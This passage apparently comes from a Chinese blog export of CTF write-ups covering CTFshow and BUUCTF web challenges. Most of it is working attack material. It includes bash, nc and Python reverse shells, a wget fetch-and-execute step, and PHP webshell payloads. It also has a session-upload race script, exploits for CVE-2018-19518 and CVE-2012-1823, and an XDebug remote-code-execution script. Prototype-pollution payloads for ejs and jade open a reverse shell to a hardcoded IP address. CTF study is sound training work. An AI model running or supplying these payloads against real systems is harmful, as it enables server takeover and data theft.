\n\n\n\n\n\n\n\n\n\n\n\n\n\n**807**\n\n### 反弹shell\n\n本地监听端口，记住要有公网IP，也可以使用frp内网穿透\n\n1. 公网服务器\n\n   监听命令\n\n   ```\n   攻击端\n   nc -lvp 监听的端口\n   受害端\n   bash -i >& /dev/tcp/攻击端IP/攻击端监听端口 0>&1\n   nc 攻击端IP 攻击端监听端口 -t /bin/bash\n   ```\n\n   利用wget下载执行\n\n   ```\n   wget 攻击端IP/shell.txt -O /tmp/shell.php && php /tmp/shell.php\n   ```\n\n   python脚本反弹\n\n   ```\n   #!/usr/bin/python\n   #-*- coding: utf-8 -*-\n   import socket,subprocess,os\n   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n   s.connect((\"攻击端IP\",攻击端监听端口)) #更改localhost为⾃⼰的外⽹ip,端⼝任意\n   os.dup2(s.fileno(),0)\n   os.dup2(s.fileno(),1)\n   os.dup2(s.fileno(),2)\n   p=subprocess.call([\"/bin/sh\",\"-i\"])\n   \n   ```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**808**\n\n### 卡临时文件包含\n\n```\nimport requests\nimport threading\nimport sys\nsession=requests.session()\nsess='yu22x'\nurl1=\"http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/\"\nurl2='http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/?file=/tmp/sess_yu22x'\ndata1={\n    'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'\n}\ndata2={\n    '1':'echo 11123;system(\"cat /*\");',\n}\nfile={\n    'file':'1'\n}\ncookies={\n    'PHPSESSID': sess\n}\ndef write():\n    while True:\n        r = session.post(url1,data=data1,files=file,cookies=cookies)\ndef read():\n    while True:\n        r = session.post(url2,data=data2)\n        if '11123' in r.text:\n            print(r.text)\n\nif __name__==\"__main__\":\n    event=threading.Event()\n    with requests.session() as session:\n        for i in range(1,30): \n            threading.Thread(target=write).start()\n        for i in range(1,30):\n            threading.Thread(target=read).start()\n    event.set()\n```\n\n纯纯看运气\n\n**809**\n\n### pear文件包含/RCE\n\n文章[在此](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)\n\n> pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定`--with-pear`才会安装。\n>\n> 不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在`/usr/local/lib/php`。\n>\n> 原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。\n>\n> 我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启`register_argc_argv`这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给`$argc`、`$argv`、`$_SERVER['argv']`几个变量。\n>\n> 如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了`register_argc_argv`，那么这其中是怎么处理的？\n>\n> HTTP数据包中的query-string会被作为argv的值\n\n最终构造的payload如下\n\n```\n?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php\n```\n\n此时/tmp/hello.php文件中就有了我们写入的`<?=phpinfo()?>`，文件包含即可\n\n**810**\n\n### SSRF打PHP-FPM\n\n有工具不用***\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206081711243.png)\n\n记得传入的时候url编码一下\n\n**811**\n\n### file_put_contents打PHP-FPM\n\n文章在[这里](https://blog.csdn.net/sdst_/article/details/118080811)\n\n用的yu22x师傅的脚本\n\n1. 伪造ftp服务器\n\n   ```python\n   import socket\n   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n   s.bind(('0.0.0.0',4566)) #端口可改\n   s.listen(1)\n   conn, addr = s.accept()\n   conn.send(b'220 welcome\\n')\n   #Service ready for new user.\n   #Client send anonymous username\n   #USER anonymous\n   conn.send(b'331 Please specify the password.\\n')\n   #User name okay, need password.\n   #Client send anonymous password.\n   #PASS anonymous\n   conn.send(b'230 Login successful.\\n')\n   #User logged in, proceed. Logged out if appropriate.\n   #TYPE I\n   conn.send(b'200 Switching to Binary mode.\\n')\n   #Size /\n   conn.send(b'550 Could not get the file size.\\n')\n   #EPSV (1)\n   conn.send(b'150 ok\\n')\n   #PASV\n   conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n') #STOR / (2)\n   conn.send(b'150 Permission denied.\\n')\n   #QUIT\n   conn.send(b'221 Goodbye.\\n')\n   conn.close()\n   ```\n\n2. gopherus生成payload\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206082140193.png)\n\n3. vps监听传参\n\n   ```\n   file=ftp://x.x.x.x:4566&content=gopherus生成的payload(只取下划线后面的内容，且不需要再次编码)\n   ```\n\n**812**\n\n### PHP-FPM未授权\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"CTFshow其他","url":"/posts/6352d546.html","content":"\n**396**\n\n`parse_url`函数将一个url拆分为如下形式\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628090124739.png)\n\n无需绕过，直接构造\n\n```\npayload:?url=http://l/l;cat fl0g* >1.txt\n```\n\n**397**\n\n加了个/tmp也没啥卵用，同上即可\n\n**398**\n\n在host处加了/;过滤，也没啥用\n\n**399**\n\n为啥跟host过不去啊，多滤了个>\n\n**400**\n\n过滤http也没用\n\n**401**\n\n同上\n\n**402**\n\n在scheme处过滤http，换个协议就行\n\n**403**\n\n```\nif(preg_match('/^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$/', $url['host'])){ \n        shell_exec('curl '.$url['scheme'].$url['host'].$url['path']); \n    } \n```\n\n这里匹配了一个ip地址，上面payload改一下就行\n\n**405**\n\n```php\nif(preg_match('/((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)./', $url['host'])){\n\tif(preg_match('/^\\/[A-Za-z0-9]+$/', $url['path'])){\n\t\tif(preg_match('/\\~|\\.|php/', $url['scheme'])){\n\t\t\tshell_exec('curl '.$url['scheme'].$url['host'].$url['path']);\n\t\t\t}\n\t\t}\n}\n```\n\n第一个在host中匹配IP地址，第二个path不能有字母数字，第三个协议中需要有php\n\n最终payload如下\n\n```\npayload:?url=php://127.0.0.1;cat fl0g.php> 1.txt;11/a\n```\n\n**406**\n\n`filter_var`函数[缺陷](https://www.cnblogs.com/lxfweb/p/13757525.html)\n\n这里过滤器在验证url的合法性\n\n```\n?url=0://www.baidu.com;'union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e/**/into/**/outfile/**/\"/var/www/html/4.php\"%23\n```\n\n访问4.php后访问1.txt即可\n"},{"title":"CTFshowphpCVE","url":"/posts/85a6a528.html","content":"\n**311**\n\nPHP版本7.1.33dev\n\nCVE-2019-11043\n\n[利用脚本](https://github.com/neex/phuip-fpizdam)\n\n**312**\n\nPHP版本5.6.38\n\nCVE-2018-19518\n\n漏洞成因\n\n> IMAP协议（因特网消息访问协议）它的主要作用是邮件客户端可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。它运行在TCP/IP协议之上，使用的端口是143。在php中调用的是imap_open函数\n>\n> `imap_open( string $mailbox,string $user,string $password）`\n>\n> 其中参数mailbox,是用来连接邮箱服务器的。它会调用rsh来连接远程shell而，debian/ubuntu中默认使用ssh来代替rsh，又因为ssh命令中可以通过设置`-oProxyCommand=`来调用第三方命令，所以攻击者通过注入这个参数，最终将导致命令执行漏洞。\n\n然后对自己想要发的内容进行一次base64编码\n\n首先对`<?php @eval($_POST[kkk]);?>`进行一次base64编码\n\n然后对`echo \"上个编码内容\" | base64 -d >shell.php`进行一次base64编码\n\n注意：如果进行base64编码后，含有+ =，都要进行url编码即%2b %3d，所以为了保证不会出错，最好再对得到的base64编码后的字符串再进行url编码。相当于步骤为先base64编码，再url编码\n\n然后将hostname的内容替换成`x+-oProxyCommand%3decho%09编码后的内容|base64%09-d|sh}`\n\n```\nhostname=x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzJ0cmExMHBPejgrInxiYXNlNjQgLWQgPnNoZWxsLnBocA==|base64%09-d|sh}&username=1&password=1\n```\n\n**313**\n\nPHP版本5.4.1\n\nCVE-2012-1823\n\n该漏洞具体成因可见[P神博客](https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html)\n\n> 命令行参数不光可以通过`#!/usr/local/bin/php-cgi -d include_path=/path`的方式传入php-cgi，更可以通过querystring的方式传入。\n>\n> 通过阅读源码，我发现cgi模式下有如下一些参数可用：\n>\n> - `-c` 指定php.ini文件的位置\n> - `-n` 不要加载php.ini文件\n> - `-d` 指定配置项\n> - `-b` 启动fastcgi进程\n> - `-s` 显示文件源码\n> - `-T` 执行指定次该文件\n> - `-h`和`-?` 显示帮助\n\n简单来说，就可以通过参数传递通过以上的参数类型传入不同的内容在执行php时被传入\n\n可通过-d直接修改php中的配置项来达到我们任意写入的效果\n\n```\npayload:?-d+allow_url_include%=on+=auto_append_file=php://input\nPOST:\n<?php system('nl /somewhere/fla9.txt');?>\n```\n\n**314**\n\n包含日志文件就过了////////////\n\n**315**\n\nPHP版本7.1.12，debug开启，端口9000\n\n> 影响\n>\n> XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote_connect_back = 1：\n>\n> ```\n> xdebug.remote_connect_back = 1\n> xdebug.remote_enable = 1\n> ```\n>\n> 这个配置下，我们访问http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。\n\n编写好的脚本，要在公网IP下使用\n\n```python\n#!/usr/bin/env python3\nimport re\nimport sys\nimport time\nimport requests\nimport argparse\nimport socket\nimport base64\nimport binascii\nfrom concurrent.futures import ThreadPoolExecutor\n\n\npool = ThreadPoolExecutor(1)\nsession = requests.session()\nsession.headers = {\n    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'\n}\n\ndef recv_xml(sock):\n    blocks = []\n    data = b''\n    while True:\n        try:\n            data = data + sock.recv(1024)\n        except socket.error as e:\n            break\n        if not data:\n            break\n\n        while data:\n            eop = data.find(b'\\x00')\n            if eop < 0:\n                break\n            blocks.append(data[:eop])\n            data = data[eop+1:]\n\n        if len(blocks) >= 4:\n            break\n    \n    return blocks[3]\n\n\ndef trigger(url):\n    time.sleep(2)\n    try:\n        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)\n    except:\n        pass\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')\n    parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')\n    parser.add_argument('-t', '--target', required=True, help='target url.')\n    parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')\n    args = parser.parse_args()\n    \n    ip_port = ('0.0.0.0', args.listen)\n    sk = socket.socket()\n    sk.settimeout(10)\n    sk.bind(ip_port)\n    sk.listen(5)\n\n    pool.submit(trigger, args.target)\n    conn, addr = sk.accept()\n    conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\\x00']))\n\n    data = recv_xml(conn)\n    print('[+] Recieve data: ' + data.decode())\n    g = re.search(rb'<\\!\\[CDATA\\[([a-z0-9=\\./\\+]+)\\]\\]>', data, re.I)\n    if not g:\n        print('[-] No result...')\n        sys.exit(0)\n\n    data = g.group(1)\n\n    try:\n        print('[+] Result: ' + base64.b64decode(data).decode())\n    except binascii.Error:\n        print('[-] May be not string result...')\n```\n\n环境寄了，没得结果\n"},{"title":"Python pickle反序列化","url":"/posts/76010d11.html","content":"\n### 什么是pickle\n\npickle是Python专用的一个进行序列化和反序列化的工具包，pickle能表示Python几乎所有的类型（包括自定义类型），由一系列opcode组成，模拟了类似堆栈的内存。\n\n与PHP序列化或者JSON，这些以键值对形式存储序列化对象数据的不同，pickle 序列化（Python独有）是将一个 `Python 对象`及其所拥有的层次结构变成可以持久化储存的`二进制数据`，无法像JSON 一样直观阅读。在Python中，采用术语 `封存 (pickling)`和` 解封 (unpickling)`来描述序列化。\n\n#### **可序列化的对象**\n\n节选自官方文档：pickle — Python 对象序列化\n\n> None, True, 和False;\n> 整数、浮点数、复数；\n> 字符串、字节、字节数组；\n> 元组、列表、集合和仅包含可提取对象的字典；\n> 在模块顶层定义的函数（内置的和用户定义的）（使用def，不是lambda）；\n> 在模块顶层定义的类；\n> 某些类实例，这些类的 `__dict__ `属性值或` __getstate__()` 函数的返回值可以被封存（详情参阅 封存类实例 这一段）。\n"},{"title":"CTFshowNodejs","url":"/posts/56040919.html","content":"\n# nodejs\n\n首先要知道nodejs是啥，其实就是javascript的后端版本\n\n一些有的没的的入门知识\n\n[nodejs一些入门特性&&实战](https://xz.aliyun.com/t/7752#toc-5)\n\n**nodejs调用系统命令的方式**\n\n如果你要是使用nodejs，你需要调用引用`child_process`模块：\n\n```js\nvar exec = require('child_process').exec;\nvar cmd = 'prince -v builds/pdf/book.html -o builds/pdf/book.pdf';\n\nexec(cmd, function(error, stdout, stderr) {\n  // 获取命令执行的输出\n});\n```\n\n这里使用的是`child_process.exec`来在nodejs程序里执行系统命令。如果你想在shell里执行命令并且要处理命令输出的I/O数据流，输出的体积比较大的话，我们需要使用`child_process.spawn`：\n\n```js\nvar spawn = require('child_process').spawn;\nvar child = spawn('prince', [\n  '-v', 'builds/pdf/book.html',\n  '-o', 'builds/pdf/book.pdf'\n]);\n\nchild.stdout.on('data', function(chunk) {\n  // output will be here in chunks\n});\n\n// or if you want to send output elsewhere\nchild.stdout.pipe(dest);\n```\n\n如果你想在nodejs里执行的是一个文件，而不是一个简单的命令，那你就需要使用`child_process.execFile`，这个方法的参数几乎和`spawn`一样，只是多了第四个回调函数参数，和`exec`里的回调函数参数一样：\n\n```js\nvar execFile = require('child_process').execFile;\nexecFile(file, args, options, function(error, stdout, stderr) {\n  // command output is in stdout\n});\n```\n\n上面的这些方法在nodejs里都是异步执行的，到但有时候我们需要同步执行一些任务，下面的一些代码例子是使用同步的方法调用系统命令执行任务：\n\n```js\n'use strict';\n\nconst\n    spawn = require( 'child_process' ).spawnSync,\n    ls = spawn( 'ls', [ '-lh', '/usr' ] );\n\nconsole.log( `stderr: ${ls.stderr.toString()}` );\nconsole.log( `stdout: ${ls.stdout.toString()}` );\nconst execSync = require('child_process').execSync;\n\nvar cmd = execSync('prince -v builds/pdf/book.html -o builds/pdf/book.pdf');\n```\n\n简单来说，调用系统命令传入的方法是\n\n\n\n在JSON解析的情况下，`__proto__`会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。\n\n\n\n\n\n\n\n\n\n**334**\n\n```javascript\nvar findUser = function(name, password){\n  return users.find(function(item){\n    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;\n  });\n};\n```\n\n直接小写就行`ctfshow+123456`\n\n**335**\n\n看源代码发现eval参数，尝试传入ls回显未找到文件，传入1+1回显2，怀疑执行了nodejs中的eval函数\n\n> 在nodejs中，eval()方法用于计算字符串，并把它作为脚本代码来执行，语法为“eval(string)”；如果参数不是字符串，而是整数或者是Function类型，则直接返回该整数或Function。\n\n构造一个系统命令执行的payload\n\n```javascript\nrequire(\"child_process\").execSync('ls')\n```\n\n拿到文件名直接cat就行\n\n**336**\n\n同上题不过增加了过滤\n\n换一个方法\n\n```javascript\nrequire('child_process').spawnSync('ls', []).stdout.toString()\n```\n\n**337**\n\n源码在此\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nvar crypto = require('crypto');\n\nfunction md5(s) {\n  return crypto.createHash('md5')\n    .update(s)\n    .digest('hex');\n}\n\n/* GET home page. */\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag='xxxxxxx';\n  var a = req.query.a;\n  var b = req.query.b;\n  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){\n  \tres.end(flag);\n  }else{\n  \tres.render('index',{ msg: 'tql'});\n  }\n  \n});\n\nmodule.exports = router;\n```\n\n要求就是传入的ab长度相等，内容不想等，加上flag字符串变量后md5运算的结果相同\n\n> 在javascript中加法的规则很简单，只能数字与数字相加或字符串和字符串相加；所有其他类型的值都会自动转换成这两个类型的值。而对象类型经过toString转换后结果为[object Object]字符串\n\n所以最终传入两个数组即可\n\n```\npayload:?a[x]=1&b[x]=2\n```\n\n为啥数组的键值不能是数字\n\n```\na={'x':'1'}\nb={'x':'2'}\n\nconsole.log(a+\"flag{xxx}\")\nconsole.log(b+\"flag{xxx}\")\n二者得出的结果都是[object Object]flag{xxx}，所以md5值也相同\n\n但是如果传a[0]=1&b[0]=2，相当于创了个变量a=[1] b=[2]，再像上面那样打印的时候，会打印出1flag{xxx}和2flag{xxx}\n```\n\n**338**\n\n原型链污染\n\n```javascript\n//login.js\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var secert = {};\n  var sess = req.session;\n  let user = {};\n  utils.copy(user,req.body);\n  if(secert.ctfshow==='36dboy'){\n    res.end(flag);\n  }else{\n    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  \n  }\n});\nmodule.exports = router;\n```\n\n`utils.copy(user,req.body);`这个和merge差不多\n\n```\npayload:\nPOST\n{\"__proto__\":{\"ctfshow\":\"36dboy\"}}\n```\n\n**339**\n\n```javascript\n//login.js\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n\nfunction User(){\n  this.username='';\n  this.password='';\n}\nfunction normalUser(){\n  this.user\n}\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var secert = {};\n  var sess = req.session;\n  let user = {};\n  utils.copy(user,req.body);\n  if(secert.ctfshow===flag){\n    res.end(flag);\n  }else{\n    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  \n  }\n});\nmodule.exports = router;\n```\n\n这要让ctfshow=flag变量，我不行捏，看看旁边的app.js\n\n```javascript\n//api.js\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  res.render('api', { query: Function(query)(query)});\n});\nmodule.exports = router;\n```\n\n- Function(\"console.log('HelloWolrd')\")()\n\n类似于php中的create_function\n\n对于ejs渲染引擎来说，对opts有原型链污染漏洞\n\n```javascript\nif (opts.outputFunctionName) {\n        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\\n';\n}\n```\n\n这里我们就可以污染outputFunctionName来执行恶意代码\n\n```js\n{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"');var __tmp2\"}}\n```\n\n通过login污染再通过api渲染调用\n\n**340**\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var user = new function(){\n    this.userinfo = new function(){\n    this.isVIP = false;\n    this.isAdmin = false;\n    this.isAuthor = false;     \n    };\n  }\n  utils.copy(user.userinfo,req.body);\n  if(user.userinfo.isAdmin){\n   res.end(flag);\n  }else{\n   return res.json({ret_code: 2, ret_msg: '登录失败'});  \n  }\n});\nmodule.exports = router;\n```\n\n这里要向上污染两层才行，其他的都和上面一样\n\n```json\n{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"');var __tmp2\"}}}\n```\n\n**341**\n\n没有api了，直接ejs的rce\n\n```json\n{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"');var __tmp2\"}}}\n```\n\n**342，343**\n\n不是ejs渲染模版了\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205282335944.png)\n\n是jade渲染模版，找jade的原型链污染rce\n\n```json\n{\"__proto__\":{\"__proto__\": {\"type\":\"Block\",\"nodes\":\"\",\"compileDebug\":1,\"self\":1,\"line\":\"global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"')\"}}}\n```\n\n**344**\n\n源码\n\n```javascript\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag = 'flag_here';\n  if(req.url.match(/8c|2c|\\,/ig)){\n  \tres.end('where is flag :)');\n  }\n  var query = JSON.parse(req.query.query);\n  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){\n  \tres.end(flag);\n  }else{\n  \tres.end('where is flag. :)');\n  }\n});\n```\n\n根据源码我们正常情况下需要传`?query={\"name\":\"admin\",\"password\":\"ctfshow\",\"isVIP\":true}`但是题目把逗号和他的url编码给过滤掉了，所以需要绕过。\n\n```\npayload:?query={\"name\":\"admin\"&query=\"password\":\"%63tfshow\"&query=\"isVIP\":true}\n```\n\nnodejs中会把这三部分拼接起来，为什么把ctfshow中的c编码呢，因为双引号的url编码是%22再和c连接起来就是%22c，会匹配到正则表达式。\n"},{"title":"BUUCTF记录2","url":"/posts/210d3ac7.html","content":"\n## [ISITDTU 2019]EasyPHP\n\n```php\n<?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET['_'];\nif ( preg_match('/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i', $_) )\n    die('rosé will not do it');\n\nif ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )\n    die('you are so close, omg');\n\neval($_);\n?>\n```\n\n`strlen(count_chars(strtolower($_), 0x3)) > 0xd`\n\n先看这个判断，count_chars函数用法如下\n\n| 参数     | 描述                                                         |\n| :------- | :----------------------------------------------------------- |\n| *string* | 必需。规定要检查的字符串。                                   |\n| *mode*   | 可选。规定返回模式。默认是 0。有以下不同的返回模式：<br />0 - 数组，ASCII 值为键名，出现的次数为键值1 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数大于 0 的值<br />2 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数等于 0 的值<br />3 - 字符串，带有所有使用过的不同的字符<br />4 - 字符串，带有所有未使用过的不同的字符 |\n\n那么上述判断条件就是要保证传入的数据中有不多于13中不同的字符，先使用phpinfo查看信息\n\n```\n?.=(~%8F%97%8F%96%91%99%90)();\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-26 15.30.06.png)\n\n可以使用scandir来扫描文件，构建payload：`print_r(scandir('.'))`\n\n使用异或脚本生成\n\n```python\nstr=\"print_r\"\nfor i in str:\n    print(hex(int(hex(ord(i)),16) ^ 0xff),end='')\n```\n\n生成的payload如下\n\n```\n?.=((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%d1)^(%ff)))); \n```\n\n但是此时我们发现超过了13个不同字符的限制，所以我们需要通过异或缩减原始字符数量\n\n```python\nnow ='\\'().;_acdinprst'\nfor i in now :\n    for j in now:\n        for k in now :\n            for m in now :\n                if ord(j)^ord(k)^ord(m) == ord(i):\n                    if(j==k or j==m or m==k ):\n                        continue\n                    else :\n                        print(i+'=='+j + '^'+ k +'^'+m)\n```\n\n结果中可供替换的字符有很多，挑出三个好用的\n\n```\nt = s^c^d\ns^0xff=0x8c\nc^0xff=0x9c \nd^0xff=0x9b\nn = i^c^d\ni^0xff=0x96\nc^0xff=0x9c\nd^0xff=0x9b\nr = a^c^p\na^0xff=0x9e\nc^0xff=0x9c\np^0xff=0x8f\n```\n\n最终异或时候将不需要异或的字符串异或0xFF两次即可\n\n```\nprint_r=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))\nscandir=((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))\n最终payload：?.=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));\n```\n\n获得文件名，尝试访问发现没有权限，只能使用函数读取`readfile(end(scandir('.')))`\n\n```\nArray ( [0] => . [1] => .. [2] => index.php [3] => n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )\n```\n\n真·最终payload\n\n```\n?.=((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF)));\n```\n\n## [GYCTF2020]Ez_Express\n\n本题触及知识盲区，乖乖学习node.js去咯\n\n首先还是要了解一下node.js，通俗意义上理解就是javascript的后端版本，所以基本上语法是和javascript一样的，这里贴个大佬的[node.js相关安全问题总结](https://www.cnblogs.com/20175211lyz/p/12659738.html)，然后就是这道题了，是node.js的原型链污染\n\n**node.js的原型链污染**\n\n在js中万物皆对象，而在js我们如果想要定义一个类的话就需要使用类似于构造函数的方式来构造\n\n```javascript\nfunction Foo() {\n    this.bar = 1\n}\nnew Foo()\n```\n\n类中的方法也同样可以写在构造函数内\n\n```javascript\nfunction Foo() {\n    this.bar = 1\n    this.show = function() {\n        console.log(this.bar)\n    }\n}\n(new Foo()).show()\n```\n\n但是这么写的问题是，我们每新建一个Foo对象时，this.show函数就会执行一次，也就是说，show方法实际上是被绑定在对象上而不是该对象的“类”上。而我们希望在创建类的时候只创建一次show方法，此时我们就需要使用原型(`prototype`)了\n\n```javascript\nfunction Foo() {\n    this.bar = 1\n}\n\nFoo.prototype.show = function show() {\n    console.log(this.bar)\n}\n\nlet foo = new Foo()\nfoo.show()\n```\n\n我们可以认为原型`prototype`是类`Foo`的一个属性，而所有用`Foo`类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的`foo`对象，其天生就具有`foo.show()`方法。\n\n我们可以通过`Foo.prototype`来访问`Foo`类的原型，但`Foo`实例化出来的对象，是不能通过prototype访问原型的。这时候，就该`__proto__`登场了。\n\n一个Foo类实例化出来的foo对象，可以通过`foo.__proto__`属性来访问Foo类的原型，也就是说：\n\n```javascript\nfoo.__proto__ == Foo.prototype\n```\n\n所以\n\n1. `prototype`是一个类的属性，所有类对象在实例化的时候将会拥有`prototype`中的属性和方法\n2. 一个对象的`__proto__`属性，指向这个对象所在的类的`prototype`属性\n3. 所有类对象在实例化的时候将会拥有`prototype`中的属性和方法，这个特性被用来实现JavaScript中的继承机制\n\n那么问题就出在对于js来说，万物皆对象，只要我们不断的向上访问`__proto__`属性，再对其中的某个属性进行修改，总能找到相对于我们需要修改的类的父类，此时再新建我们需要修改的类时就自动带上了我们修改的内容\n\n以上全是知识，正式开始做题\n\n首先就是这个\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/20220526230030.png)\n\n用admın经过`toUpperCase`处理后变成ADMIN，进去之后没啥头绪，扫个目录吧，www.zip拿到源码，可以看到res中的outputFunctionName属性为空，可以进行污染，并且在info中直接获得的就是outputFunctionName中的内容\n\n```javascript\nrouter.get('/', function (req, res) {\n  if(!req.session.user){\n    res.redirect('/login');\n  }\n  res.outputFunctionName=undefined;\n  res.render('index',data={'user':req.session.user.user});\n});\n```\n\n再加上上面的clone方法\n\n```javascript\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\n```\n\n此时我们向/action中传入json编码后的payload\n\n```\nPOST:\n{\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//\"}}\n```\n\n再访问info即可获取flag\n\n## [安洵杯 2019]不是文件上传\n\n传文件，试后缀，扫目录都不行，看源码\n\n```php\n<?php\nclass helper {\n\tprotected $folder = \"pic/\";\n\tprotected $ifview = False; \n\tprotected $config = \"config.txt\";\n\t// The function is not yet perfect, it is not open yet.\n\n\tpublic function 